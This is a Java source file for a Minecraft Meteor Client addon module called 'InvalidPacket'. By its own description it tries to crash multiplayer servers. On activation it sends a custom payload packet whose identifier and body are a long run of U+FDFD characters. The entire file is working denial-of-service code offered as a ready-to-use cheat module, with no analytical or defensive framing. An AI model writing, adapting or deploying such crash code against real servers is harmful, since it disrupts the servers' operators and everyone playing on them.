package WideCat.MeteorCrashAddon.modules;

import WideCat.MeteorCrashAddon.MeteorCrashAddon;
import io.netty.buffer.Unpooled;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.game.GameLeftEvent;
import minegame159.meteorclient.modules.Module;
import minegame159.meteorclient.settings.BoolSetting;
import minegame159.meteorclient.settings.Setting;
import minegame159.meteorclient.settings.SettingGroup;
import minegame159.meteorclient.utils.player.ChatUtils;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;

public class InvalidPacket extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(false)
            .build()
    );

    public InvalidPacket() {
        super(MeteorCrashAddon.CATEGORY, "invalid-packet", "Attempts to crash the server by sending an invalid packet.");
    }

    private final String message = "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd";

    @Override
    public void onActivate() {
        mc.player.networkHandler.sendPacket(new CustomPayloadC2SPacket(new Identifier(message),
                (new PacketByteBuf(Unpooled.buffer())).writeString(message)));
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) return;
        toggle();
    }

}
